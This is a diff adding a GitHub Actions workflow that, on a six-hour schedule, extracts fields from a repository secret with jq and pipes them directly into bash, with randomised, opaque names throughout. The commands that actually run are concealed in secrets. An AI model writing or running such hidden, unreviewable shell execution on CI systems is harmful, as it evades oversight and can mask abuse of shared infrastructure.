@@ -1,0 +1,23 @@
+name: zhuhougongshun
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '35 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuhougongshun
+        env:
+          rnhy0: ${{ secrets.rnhy0 }}
+        run: |
+          echo $rnhy0 | jq -r .soxq5169 | /bin/bash
+          echo $yuf46 | jq -r .ix03546 | /bin/bash
+          echo $neu6 | jq -r .iv12666 | /bin/bash
+          echo $u218 | jq -r .qjyc034 | /bin/bash
+          echo $jigso6964 | jq -r .oxpaz013 | /bin/bash
+          echo $bd51865 | jq -r .jb1 | /bin/bash
+          echo $uvvr993 | jq -r .yivd2 | /bin/bash
+
